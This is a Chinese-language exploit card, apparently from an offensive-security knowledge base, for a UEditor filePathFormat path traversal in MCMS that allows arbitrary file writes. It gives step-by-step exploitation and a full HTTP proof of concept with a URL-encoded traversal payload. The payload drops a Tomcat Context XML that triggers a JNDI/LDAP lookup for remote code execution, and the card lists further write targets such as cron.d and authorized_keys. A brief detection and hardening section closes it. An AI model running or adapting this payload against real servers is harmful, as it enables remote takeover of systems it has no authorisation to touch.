---
id: web-generic-file-upload-ueditor-filepathformat-traversal
title: UEditor filePathFormat 模板目录穿越导致任意路径文件写
type: scenario
domain: web
path: web/generic/file-upload
technique: ueditor-filepathformat-traversal-write
aliases:
- UEditor filePathFormat 穿越
- UEditor jsonConfig 任意文件写
- MCMS UEditor 上传
- ueditor-1.1.2 文件上传
- PathFormat 目录穿越
tags:
- web
- file-upload
- ueditor
- path-traversal
- arbitrary-file-write
- jsonconfig
- mcms
- java
cve: []
severity: high
confidence: high
status: verified
affected_versions: MCMS v5.4.1；UEditor 1.4.3.3（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:28:27+08:00'
  notes: 已对照原文与 35 张图核对：图34 请求的 jsonConfig 解码为 {filePathFormat:'/{.}./{.}./{.}.//conf/Catalina/localhost/1'}，响应 url 为 /upload/../../../conf/Catalina/localhost/1.xml，证实 filePathFormat 模板穿越与 .xml 后缀白名单；图35 为写入的 Context/Manager JdbcRowSetImpl XML 及触发结果。ActionEnter/ConfigManager/Uploader.save 的 savePath 来源与 rootPath+savePath 拼接描述与原文代码一致；{.}. 语义为原文实测构造，卡片已限定为原文用法。affected_versions 保留原文明确点名的 MCMS v5.4.1 与 UEditor 1.4.3.3。PoC 未在本机执行。
---

## 一句话结论

UEditor 的 `editor.do`/上传入口接受客户端传入的 `jsonConfig`，并把其中的 `filePathFormat` 直接作为保存路径模板；`PathFormat.parse` 只展开日期/随机数等占位符、不清理 `../` 序列，`rootPath + savePath` 未做规范化校验，攻击者即可用合法的 `.xml` 后缀把文件写到 Web 根目录之外的任意可写位置（如 Tomcat 的 `conf/Catalina/localhost/`）。

## 原理

- UEditor 的 `ActionEnter` 把请求参数交给 `ConfigManager`；`ConfigManager` 在初始化时会读取请求中的 `jsonConfig`（URL 编码的 JSON），并用它覆盖服务端配置。随后 `getConfig()` 从 `jsonConfig` 取出 `filePathFormat` 作为 `savePath` 放入上传配置。
- `Uploader.save` 从配置取 `savePath`，调用 `PathFormat.parse(savePath, originFileName)` 展开 `{yyyy}`、`{time}`、`{rand:6}` 等模板，得到最终相对路径；随后 `physicalPath = rootPath + savePath`，交给 `StorageManager.saveFileByInputStream` 写文件。
- 关键缺陷是 `PathFormat.parse` 不剥离 `../`（也不做 `canonicalize`/前缀校验），`rootPath + savePath` 只是字符串拼接。模板中的占位符可以被构造成 `../` 段（原文 PoC 用 `{.}.` 形式，每个展开为 `..`），从而让最终路径跳出 `rootPath`。
- 上传类型校验只看原始文件名的后缀是否在 `fileAllowFiles` 中；UEditor 默认白名单包含 `.xml`，因此可以上传内容任意的 XML。最终写到哪里由 `filePathFormat` 决定，与后缀校验无关。
- 这就把“只能上传图片/文档”的上传点变成了“任意可写目录的任意 XML（或白名单内类型）写入”，并可进一步配合 Tomcat Digester 解析 `conf/Catalina/localhost/*.xml` 触发 JNDI/RCE。

## 触发条件

- 目标暴露 UEditor 上传入口（如 `/static/plugins/ueditor/1.4.3.3/jsp/editor.do`、`controller.jsp`），且上传 action 对匿名/低权限用户开放。
- 目标版本把请求参数 `jsonConfig` 合并进配置，且允许其覆盖 `filePathFormat`（原文 MCMS v5.4.1 + UEditor 1.4.3.3）。
- `fileAllowFiles` 包含目标后缀（`.xml` 默认包含；若目标是 JSP webshell，则需 `.jsp` 在名单内或存在解析绕过）。
- Tomcat/应用进程对目标目录有写权限，且目标目录不在只读挂载或安全策略保护下。

## 利用步骤

1. 确认 UEditor 路径与上传 action；访问 `?action=config` 或查看前端配置，确认 `fileAllowFiles` 是否包含 `.xml`。
2. 构造 `jsonConfig`：`{"filePathFormat":"/{.}./{.}./{.}.//conf/Catalina/localhost/1"}`，其中 `{.}.` 展开为 `..`，最终路径为 `../../../conf/Catalina/localhost/1`。
3. 对 `jsonConfig` 做 URL 编码，作为 `editor.do` 的查询参数；`action=uploadfile`（或目标实际 action）。
4. 以 multipart 上传一个 `.xml` 文件，字段名按目标配置（原文为 `upload`，UEditor 默认常为 `upfile`）。
5. 从响应 JSON 的 `url` 字段确认落地路径；若出现 `../` 或 `conf/Catalina/localhost` 说明穿越成功。
6. 结合 Tomcat XML 配置机制触发 JNDI，或写入其他可执行/可解析文件。

## PoC

```text
POST /static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=%7b%66%69%6c%65%50%61%74%68%46%6f%72%6d%61%74%3a%27%2f%7b%2e%7d%2e%2f%7b%2e%7d%2e%2f%7b%2e%7d%2e%2f%2f%63%6f%6e%66%2f%43%61%74%61%6c%69%6e%61%2f%6c%6f%63%61%6c%68%6f%73%74%2f%31%27%7d&action=uploadfile HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data;boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA
Content-Length: 429

--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA
Content-Disposition: form-data; name="upload"; filename="2.xml"

<?xml version='1.0' encoding='utf-8'?>
<Context>
    <Manager className="com.sun.rowset.JdbcRowSetImpl"
             dataSourceName="ldap://127.0.0.1:8085/SbfXuVhz"
             autoCommit="true"></Manager>
</Context>
--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA--
```

```text
# jsonConfig 解码后（便于阅读）：
# {"filePathFormat":"/{.}./{.}./{.}.//conf/Catalina/localhost/1"}
#
# 响应中的 url 形如：
# {"original":"2.xml","title":"1.xml","type":".xml",
#  "url":"/upload/../../../conf/Catalina/localhost/1.xml"}
# 说明文件被写到 rootPath 之外的 conf/Catalina/localhost/1.xml
```

## 变体与关联

- 变体：`jsonConfig` 还可能覆盖其他配置键（如保存路径、允许后缀、最大尺寸）；若能覆盖 `fileAllowFiles`，可直接放宽类型限制。
- 变体：`filePathFormat` 也可直接写 `../../`（若目标版本的 `PathFormat` 不拦截）；`{.}` 只是原文使用的占位符构造方式。
- 变体：写入目标按利用方式选择——Tomcat `conf/Catalina/localhost/*.xml`（配合 XML Digester JNDI）、`webapps/` 下的 WAR/JSP、`/etc/cron.d/`、`~/.ssh/authorized_keys` 等。
- 关联：[[web-java-component-tomcat-xml-digester-setter-jndi]]（本卡写入 XML 后的利用 sink）；[[web-generic-file-upload-ueditor-default-whitelist-xml-xss]]（同一 UEditor 默认 `.xml` 白名单的存储型 XSS 用法）。
- 边界：服务端不信任客户端 `jsonConfig`、对 `filePathFormat` 做白名单/规范化校验、或在 `rootPath + savePath` 后做 `canonicalPath.startsWith(rootPath)` 校验时链路失效；目标后缀不在 `fileAllowFiles` 且无解析绕过时，只能写白名单内类型；目标目录不可写时失败。

## 检测与防御

- 检测：监控上传请求中的 `jsonConfig` 参数及其 `filePathFormat` 值；告警包含 `../`、`{.}`、`%2e%2e`、`conf/Catalina`、`webapps`、`cron` 等路径特征的上传；检查响应 `url` 是否出现 `../` 或落到非上传目录。
- 修复：服务端忽略客户端传入的 `jsonConfig`（或只接受白名单键）；`filePathFormat` 由服务端固定，禁止包含路径分隔符与 `..`；上传保存路径做 `canonicalize` 后校验必须位于上传根目录内。
- 加固：上传目录移出 Web 根与 Tomcat 配置目录，使用随机文件名、独立域名/`Content-Disposition: attachment`；收紧 `fileAllowFiles`，移除 `.xml` 等可解析类型；删除 UEditor 示例/测试目录，升级到修复版本。
